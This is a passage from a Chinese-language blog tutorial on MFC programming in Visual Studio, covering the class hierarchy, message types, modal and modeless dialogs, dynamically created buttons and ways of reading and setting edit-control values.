href="https://docs.microsoft.com/zh-cn/cpp/mfc/hierarchy-chart?view=msvc-170&viewFallbackFrom=2022">文档戳链接，如果有误跳转时可修改最后参数，此参数为年份</a></p><p>看层次结构的目的是为了以后当参数转换啥的更方便，像自己在vs里面不断跳转定义也ok，就是稍微麻烦了点。</p><p>层次的视觉感观会更直接，比如生物-动物-人-男人，作为派生类，总会有一些与其父类相关的特性。</p><p>CObject</p><ul><li>支持序列化<ul><li>可能把一个结构体变成一个字符串，几个字节存放一个数据，最后留俩当长度</li><li>也可能是{x:100,y:200}这样结构化，类似于json</li><li>….等都是一种序列化的表现</li></ul></li><li>支持运行时提供类的信息<ul><li><code>static CRuntimeClass *PASCAL _GetBaseClass();</code></li><li><code>static CRuntimeClass *PASCAL GetThisClass();</code></li><li>正常的派生类下来，并不会刻意保留父类叫什么，而mfc做了一些优化</li></ul></li><li>支持动态创建以及支持对象诊断输出<ul><li><code>virtual void AsserValid() const;</code></li><li><code>virtual void Dump(CDumpContext&amp; dc) const;</code></li><li>当mfc启动时，有些需求不是立马就创建的，只有当触发的时候才会创建</li></ul></li></ul><p>有这么一个超级基类的存在，就提供了无限的可能，但是这种级别的东西不适合个人开发。</p><hr><h2 id="mfc框架理论"><a href="#mfc框架理论" class="headerlink" title="mfc框架理论"></a>mfc框架理论</h2><h3 id="关键类"><a href="#关键类" class="headerlink" title="关键类"></a>关键类</h3><p><code>CWinApp</code>:MFC应用程序抽象，负责管理Document Template<br><code>CFrameWnd</code>:框架窗口、负责创建应用的主窗口，含标题栏、菜单栏、工具栏、状态栏等<br><code>CView</code>:负责展示应用数据，View其实是一个没有边框的窗口，客户区<br><code>CDocument</code>:负责存储应用数据</p><hr><h3 id="关键类之间的关系"><a href="#关键类之间的关系" class="headerlink" title="关键类之间的关系"></a>关键类之间的关系</h3><p>CDocTemplate、CDocument、CView、CFrameWnd关系</p><ul><li>CWinApp 拥有一个对象指针：CDocManager *m_pDocManager</li><li>CDocManager拥有一个指针链表CPtrList m_templateList，用来维护一系列的DocumentTemplate。应用程序在CMyWinApp::InitInstance中以AddDocTemplate将这些Document Templates加入到有CDocTemplate所维护的链表之中</li><li>CDocTemplate拥有三个成员变量，分别持有Document、View、Frame的CRuntimeClass指针，另有一个成员变量m_nIDResource，用来表示此Document显示时应该采用的UI对象。这四位数据在CMyWinApp::InitInstance函数构造CDocTemplate时指针，称为构造函数的参数。</li><li>CDocument有一个成员变量CDocTemplate *m_pDocTemplate，回指其DocumentTemplate；另外有一个成员变量CPtrList m_viewList，表示它可以同时维护一组Views。</li><li>CFrameWnd有一个成员变量Cview *m_pViewActive，指向当前活动的View</li><li>CView有一个成员变量CDocument *m_pDocument，指向相关的Document</li></ul><p>结构层次化都是为了方便开发和维护。</p><hr><h3 id="消息分类"><a href="#消息分类" class="headerlink" title="消息分类"></a>消息分类</h3><p>mfc消息的分类大致分为三种：标准消息、命令消息、通告消息。</p><ol><li>标准消息：除WM_COMMAND之外，所有以WM_开头的消息。从CWnd类派生的类都可以接受到这一类消息</li><li>命令消息：来自菜单、加速键或者工具栏按钮的消息。这类消息都以WM_COMMAND呈现。在MFC中，通过菜单项的标识(id)来区分不同的命令消息；在sdk中，通过消息的wParam参数识别。从CCmdTarget(CWnd的父类)派生的类都可以接收到这一类消息</li><li>通告消息：由控件产生的消息，例如按钮的单击，列表框的选择等均会产生此类消息，为的是向其父窗口(通常为对话框)通知时间的发生。这类消息也是以WM_COMMAND形式呈现。从CCmdTarget(CWnd的父类)派生的类都可以接收到这一类消息。</li></ol><p>小结：凡是从Cwnd派生的类，即可以接受标准消息，也可以接收命令消息和通告消息。<br>而对于那些从CCmdTarget派生的类，则只能接受命令消息和通告消息，不能接受标准消息。</p><hr><h2 id="对话框"><a href="#对话框" class="headerlink" title="对话框"></a>对话框</h2><p>是与用户进行交互的控件，如文件对话框、字体对话框、颜色对话框等，一般用于告示、提醒等。</p><img src="/2022/07/25/mfc01/042.png" class=""><p>app这个是之前创建的对话框，从类视图可以看到只有三个类。比文档的结构观感上要简洁不少。</p><p>其中标准消息可以直接通过类视图-&gt;选择项目的类-&gt;属性里面找到消息即可。</p><p>对话框其实就是一个窗口，它不仅可以接收消息，而且还可以被移动或者关闭，甚至是在客户区中进行绘图。这些都是有CWnd类派生而来。</p><img src="/2022/07/25/mfc01/043.png" class=""><p>其中除了最基础的消息，还有控件</p><img src="/2022/07/25/mfc01/044.png" class=""><p>利用拖动控件的方式，可以省去很多麻烦。</p><hr><h3 id="创建对话框"><a href="#创建对话框" class="headerlink" title="创建对话框"></a>创建对话框</h3><p>同样的，已有的几个是根据项目类型产生的，我们当然可以进行创建<br>在资源视图中，选这个项目的Dialog，然后右击添加资源</p><img src="/2022/07/25/mfc01/045.png" class=""><p>这里不选子类直接选Dialog也是可以的。</p><img src="/2022/07/25/mfc01/046.png" class=""><p>通过Dialog创建的它的对话框属性只有一个id能修改，问题不大，改个有意义的就行</p><img src="/2022/07/25/mfc01/047.png" class=""><p>资源属性这边能改的就很多。</p><p>图形化的做完了，代码实现部分就需要类去控制它</p><img src="/2022/07/25/mfc01/048.png" class=""><p>直接右击添加类，类名随便写尽量有意义，然后继承的基类，一般是这头两个。ex说过就是拓展的意思。</p><p>这种通过简单的方式创建出模板的好处就是省去了一些小麻烦，也不容易出问题</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCApplication1Dlg::OnBnClickedOk</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="comment">//MessageBox(_T(&quot;你好呀!&quot;));</span></span><br><span class="line">CBingDialog dlg;</span><br><span class="line">dlg.<span class="built_in">DoModal</span>();</span><br><span class="line"></span><br><span class="line">CDialogEx::<span class="built_in">OnOK</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在主窗口的确认按钮下设置，将我们新建的CBingDialog作为模块化弹出</p><img src="/2022/07/25/mfc01/049.png" class=""><p>当dlg弹出之后，原先的窗口是不可改变的状态，只有dlg关闭之后才能操作后面的对话框。</p><p><code>DoModal</code>这就是所谓的模态对话框，有的时候会觉得不太方便吧，但是如果是警示之类的还是挺好的。</p><p>有模态化就有非模态化的，非模态化的一个问题其实猜也能猜到，就是因非模态化而产生的对话框不会卡住，如果这个变量优先级不够，很有可能在不知道的地方就被析构释放了，在逻辑上会导致很严重的问题，而且设置起来也较为麻烦。</p><p><strong>首先因为没有锁或者说阻塞，所以当按钮按下的适合，这个新建的对话框一闪而过，结束的很快。</strong><br>所以要在头文件类中建一个全局变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CMFCApplication1Dlg</span> : <span class="keyword">public</span> CDialogEx</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 构造</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">CMFCApplication1Dlg</span>(CWnd* pParent = <span class="literal">nullptr</span>);<span class="comment">// 标准构造函数</span></span><br><span class="line">CBingDialog dlg;<span class="comment">//注意引用头文件不然是未定义的类型</span></span><br><span class="line"><span class="comment">//....后面的省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后又要在对话框源文件中，找到oninitdialog函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line">dlg.<span class="built_in">Create</span>(IDD_DIALOG_NEW, <span class="keyword">this</span>);</span><br></pre></td></tr></table></figure><p>在这完成初始化。</p><p>最后在按钮消息中触发显示</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCApplication1Dlg::OnBnClickedOk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">dlg.<span class="built_in">ShowWindow</span>(SW_SHOW);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到非模态化的对话框设置起来就要挺多步骤了。</p><img src="/2022/07/25/mfc01/050.png" class=""><p>非模态化的效果就是不会阻塞，后面的窗口是可以操作的。</p><p>或者你可以直接在对话框源文件中定义全局变量<code>CBingDialog dlg;</code><br>然后再按钮消息中设置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCApplication1Dlg::OnBnClickedOk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">dlg.<span class="built_in">Create</span>(IDD_DIALOG_NEW, <span class="keyword">this</span>);</span><br><span class="line">dlg.<span class="built_in">ShowWindow</span>(SW_SHOW);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是可行的，因为这个dlg变量不会再按钮结束后立马被析构掉。</p><p><strong>总而言是，模态化对话框的使用场景肯定是基于会修改影响到其他窗口，这个时候肯定要设置称模态化对话框去阻塞，不然改动了还原的部分都没的操作了。非模态像vs的视图吧，这些对话框不会直接影响主窗口的就适用于非模态</strong></p><hr><h3 id="按钮"><a href="#按钮" class="headerlink" title="按钮"></a>按钮</h3><p>按钮的创建，从图形化角度，直接拖动控件是最直接的，拖动完成后保存，然后双击这个按钮直接会跳转到代码界面，你就可以编辑这个按钮消息能干什么了。</p><img src="/2022/07/25/mfc01/051.png" class=""><p>新建一个按钮，修改一下描述文字和id，然后双击开始编辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::OnBnClickedButtonTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):%s\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>老样子在日志里输出文件路径，行号，函数名。</p><img src="/2022/07/25/mfc01/052.png" class=""><p>这玩意肯定是不会有啥问题了。</p><img src="/2022/07/25/mfc01/053.png" class=""><p>至于动态布局，就是比例放大或者缩小的适合这个按钮的位置会自动调整，不设置的话窗口放大或者缩小它的位置都不会改变。</p><p>其它的一些行为都有中文描述可以自己试一下。</p><p>然后就是通过按钮去创建自定义按钮，本质上就是手动整活了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">CButton m_Btn;<span class="comment">//自定义按钮</span></span><br></pre></td></tr></table></figure><p>在头文件中肯定要预先定义这个空的按钮。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::OnBnClickedButtonTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):%s\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( m_Btn.m_hWnd == <span class="literal">NULL</span> ) &#123;</span><br><span class="line">m_Btn.<span class="built_in">Create</span>(_T(<span class="string">&quot;动态&quot;</span>), BS_DEFPUSHBUTTON | WS_VISIBLE | WS_CHILD, <span class="built_in">CRect</span>(<span class="number">100</span>, <span class="number">100</span>, <span class="number">200</span>, <span class="number">150</span>), <span class="keyword">this</span>, <span class="number">9999</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>BS_DEFPUSHBUTTON | WS_VISIBLE | WS_CHILD</code><br>BS开头就是button style，按钮自带的样式，WS就是 windows style，译为windows系统的样式，具体种类可以转到定义，有不少这样的类型。</p><p><strong>注意下最后的id，不要通过变量传递去改变，一定要固定为主，避免冲突或者广播，因为id重了，获取消息的时候就可能一起接收或者发送</strong></p><img src="/2022/07/25/mfc01/054.png" class=""><p>跑起来之后，点击test_button之后就会弹出这个动态的按钮，看上去可能有点潦草，毕竟是随便建的。</p><blockquote><p>如果采用全局变量dlg是在源文件的要注意一下<br>可能存在窗口创建多次报错</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCApplication1Dlg::OnBnClickedOk</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( dlg.m_hWnd == <span class="literal">NULL</span> ) &#123;</span><br><span class="line">dlg.<span class="built_in">Create</span>(IDD_DIALOG_NEW, <span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">dlg.<span class="built_in">ShowWindow</span>(SW_SHOW);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给他加个验证以防万一</p><p><strong>动态按钮的创建，还是随着用户改变为主，一般用的少</strong><br>不过没启用之前也不占资源倒是一件好事，顶多留个指针。</p><hr><h2 id="控件"><a href="#控件" class="headerlink" title="控件"></a>控件</h2><p>正常情况下，我们知道访问这个控件，比如按钮，肯定是在当前窗口访问最直接也不需要额外操作，但是别的窗口如果要访问，就是另一回事了。</p><img src="/2022/07/25/mfc01/055.png" class=""><p>首先给这个对话框里面添加三个文本框，默认是空的，通过别的地方传递给这个文本框一个初始值。</p><p>在自定义的对话框初始化一个文本框之前需要注意，我们自定义的他少一个标准的函数<code>OnInitDialog()</code>作为初始化用</p><p>打开类视图-&gt;找到这个项目选择CBingDialog-&gt;然后属性那边有个重写往下滑找到<code>OnInitDialog()</code>点击后面add即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CBingDialog::OnInitDialog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span>  在此添加额外的初始化</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// return TRUE unless you set the focus to a control</span></span><br><span class="line">  <span class="comment">// 异常: OCX 属性页应返回 FALSE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="访问文本框"><a href="#访问文本框" class="headerlink" title="访问文本框"></a>访问文本框</h3><p>通过父类CWnd，我们可以直接在对话框初始化这些文本框</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CBingDialog::OnInitDialog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span>  在此添加额外的初始化</span></span><br><span class="line">CWnd *pEdit01 = <span class="built_in">GetDlgItem</span>(IDC_EDIT_ONE);</span><br><span class="line">CWnd *pEdit02 = <span class="built_in">GetDlgItem</span>(IDC_EDIT_TWO);</span><br><span class="line">CWnd *pEdit03 = <span class="built_in">GetDlgItem</span>(IDC_EDIT_THREE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( pEdit01 != <span class="literal">NULL</span> ) pEdit01-&gt;<span class="built_in">SetWindowText</span>(_T(<span class="string">&quot;100&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> ( pEdit02 != <span class="literal">NULL</span> ) pEdit02-&gt;<span class="built_in">SetWindowText</span>(_T(<span class="string">&quot;200&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> ( pEdit03 != <span class="literal">NULL</span> ) pEdit03-&gt;<span class="built_in">SetWindowText</span>(_T(<span class="string">&quot;300&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// return TRUE unless you set the focus to a control</span></span><br><span class="line">  <span class="comment">// 异常: OCX 属性页应返回 FALSE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/056.png" class=""><p>这个setwindowstext不仅能设置，还能取出值，类型应是Cstring</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CString setText;</span><br><span class="line">pEdit01-&gt;<span class="built_in">SetWindowText</span>(strText);</span><br></pre></td></tr></table></figure><p>用父类的CWnd去接收可能有点麻烦，但是至少能判断是否获取成功了<br>因为还有一种直接的方式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SetDlgItemText</span>(IDC_EDIT_ONE, _T(<span class="string">&quot;100&quot;</span>));</span><br><span class="line"><span class="built_in">GetDlgItemText</span>(IDC_EDIT_ONE, strText);</span><br></pre></td></tr></table></figure><p>这种方式呢，主要是产生错误的时候你也不晓得是前者不存在，还是后者溢出。</p><p>还有一种是针对无符号整型的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SetDlgItemInt</span>(IDC_EDIT_THREE, <span class="number">300</span>);</span><br><span class="line">BOOL isTrans = FALSE;</span><br><span class="line">UINT ret = <span class="built_in">GetDlgItemINt</span>(IDC_EDIT_THREE, &amp;isTrans);</span><br></pre></td></tr></table></figure><p>加这个布尔值的意思是，如果传输成功，这个布尔值就会变成TRUE，那么ret的值自然就是300，到不太在意ret了，如果还是FALSE，则说明传递失败了。</p><hr><h3 id="添加变量"><a href="#添加变量" class="headerlink" title="添加变量"></a>添加变量</h3><p>先去Diglog页面，选中文本框右击，添加变量打开即可。</p><img src="/2022/07/25/mfc01/057.png" class=""><p>选择类别，一种是值一种是控件，这边现用值，名称看着来。<br>选择类别为值后，变量的类型也需要确定，默认来说字符串Cstring更合适，这边先用int玩，注释就更不用说了。</p><img src="/2022/07/25/mfc01/058.png" class=""><p>选择int这种值类型，在其他这里就会有最小值和最大值的分别。最大字符数是给字符串类型用的，至于下面的文件倒不用特意选了，毕竟这个添加变量是在CBingDialog下添加的，默认就在这里。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;afxdialogex.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CBingDialog 对话框</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CBingDialog</span> : <span class="keyword">public</span> CDialogEx</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DECLARE_DYNAMIC</span>(CBingDialog)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">CBingDialog</span>(CWnd* pParent = <span class="literal">nullptr</span>);   <span class="comment">// 标准构造函数</span></span><br><span class="line"><span class="keyword">virtual</span> ~<span class="built_in">CBingDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对话框数据</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> AFX_DESIGN_TIME</span></span><br><span class="line"><span class="keyword">enum</span> &#123; IDD = IDD_DIALOG_NEW &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">CButton m_Btn;<span class="comment">//自定义按钮</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">DoDataExchange</span><span class="params">(CDataExchange* pDX)</span></span>;    <span class="comment">// DDX/DDV 支持</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">DECLARE_MESSAGE_MAP</span>()</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function">afx_msg <span class="type">void</span> <span class="title">OnBnClickedButtonTest</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> BOOL <span class="title">OnInitDialog</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">// 文本框1的值</span></span><br><span class="line">    <span class="type">int</span> m_Value1;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>能看到下面有个注释，然后是我们新增的变量。<br>在源文件中同样有初始化的地方</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::DoDataExchange</span><span class="params">(CDataExchange* pDX)</span> </span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">DoDataExchange</span>(pDX);</span><br><span class="line"><span class="built_in">DDX_Text</span>(pDX, IDC_EDIT_ONE, m_Value1);</span><br><span class="line"><span class="built_in">DDV_MinMaxInt</span>(pDX, m_Value1, <span class="number">-9999</span>, <span class="number">9999</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>别的不说，这个绑定在文本框的id和名称，还有下面的最大值最小值肯定看得出来。</p><p><strong>那么肯定会好奇绑定这个值类型的变量有什么用？</strong></p><p>给另外两个文本框都添加变量<br>然后给确定按钮写代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::OnBnClickedOk</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">UpdateData</span>();<span class="comment">//无参数默认为TRUE，此时把界面的值传到变量</span></span><br><span class="line">m_Value3 = m_Value1 + m_Value2;</span><br><span class="line"><span class="built_in">UpdateData</span>(FALSE);<span class="comment">//为FALASE时，把值传回到界面</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//CDialogEx::OnOK();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是按下之后，文本框三的内容是1+2的就对了。<br>这里随便修改一下文本框2的内容，然后再按下确认，能看到文本框3的内容改变了</p><img src="/2022/07/25/mfc01/059.png" class=""><hr><h3 id="添加控件"><a href="#添加控件" class="headerlink" title="添加控件"></a>添加控件</h3><p>方法一致，在Dialog视图中右击文本框添加变量，只不过类型改成控件<br>当三个都添加完成之后编写代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::OnBnClickedOk</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"></span><br><span class="line">CString str1, str2, str3;</span><br><span class="line">m_Edit1.<span class="built_in">GetWindowText</span>(str1);</span><br><span class="line">m_Edit2.<span class="built_in">GetWindowText</span>(str2);</span><br><span class="line"><span class="type">int</span> t = _wtoi(str1) + _wtoi(str2);</span><br><span class="line">TCHAR buf[<span class="number">32</span>] = _T(<span class="string">&quot;&quot;</span>);</span><br><span class="line">_itow_s(t, buf, <span class="number">10</span>);</span><br><span class="line">str3 = buf;</span><br><span class="line">m_Edit3.<span class="built_in">SetWindowText</span>(str3);</span><br><span class="line"></span><br><span class="line"><span class="comment">//CDialogEx::OnOK();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>控件创建的时候变量类型是CEdit，那么推测也是跟字符串有关的，所以在做加法之前先完成一个转换。<br>最后得到的结果也是成功的</p><img src="/2022/07/25/mfc01/060.png" class=""><p>虽然肯能不是很实用，但是总归是个小技巧</p><hr><h3 id="SendMessage"><a href="#SendMessage" class="headerlink" title="SendMessage"></a>SendMessage</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SendMessage</span>(WM_GETTEXT);</span><br><span class="line"><span class="built_in">SendMessage</span>(WM_SETTEXT);</span><br></pre></td></tr></table></figure><p>不过这俩在函数内部，其实也不知道发给谁，顶多是传给往上一层的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::OnBnClickedButtonTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):%s\n&quot;</span>, __FILE__, __LINE__, __FUNCTION__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( m_Btn.m_hWnd == <span class="literal">NULL</span> ) &#123;</span><br><span class="line">m_Btn.<span class="built_in">Create</span>(_T(<span class="string">&quot;动态&quot;</span>), BS_DEFPUSHBUTTON | WS_VISIBLE | WS_CHILD, <span class="built_in">CRect</span>(<span class="number">100</span>, <span class="number">100</span>, <span class="number">200</span>, <span class="number">150</span>), <span class="keyword">this</span>, <span class="number">9999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TCHAR buf[<span class="number">20</span>] = _T(<span class="string">&quot;&quot;</span>);</span><br><span class="line">::<span class="built_in">SendMessage</span>(m_Edit1.m_hWnd, WM_GETTEXT, <span class="number">20</span>, (LPARAM)buf);</span><br><span class="line">m_Edit1.<span class="built_in">SendMessage</span>(WM_SETTEXT, <span class="built_in">sizeof</span>(buf), (LPARAM)buf);</span><br><span class="line"><span class="built_in">SendMessage</span>(WM_GETTEXT, <span class="number">20</span>, (LPARAM)buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>老实说这后面的在干什么我也看不懂了。<br>不过打断点调试之后，看到buf的值是取了这个窗口的标题</p><img src="/2022/07/25/mfc01/061.png" class=""><p>不过按照推理<code>m_Edit1.m_hWnd</code>这个应该是通过控件获取到这个当前窗口句柄了，然后get句柄的Text属性到buf上，之所以能找到这个窗口句柄感觉还是因为<code>::</code>全局作用域的关系，然后后面这个文本框发送消息到buf上这个说法上不太通顺，因为用文本框发送消息和按钮按下后发送消息，buf理论都一样了吧，毕竟是从窗口句柄取值的。</p><p><strong>打个？后面碰到了在细究</strong></p><hr><h2 id="对话框伸缩"><a href="#对话框伸缩" class="headerlink" title="对话框伸缩"></a>对话框伸缩</h2><p>其实窗口是有自带的缩放，但是这里先自定义两个按钮去实现</p><img 